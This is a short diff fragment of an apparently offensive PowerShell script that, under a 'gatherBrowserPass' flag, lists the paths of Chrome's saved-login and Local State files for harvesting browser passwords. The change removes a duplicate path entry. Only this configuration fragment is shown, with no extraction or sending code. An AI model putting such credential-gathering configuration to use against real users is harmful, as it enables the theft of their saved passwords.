@@ -142,7 +142,6 @@ if ($gatherBrowserPass) {
             ProcessName = "chrome"
             LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
             LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Local State"
-            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Login Data For Account"
             Prefix = "Chrome"
         },
         @{
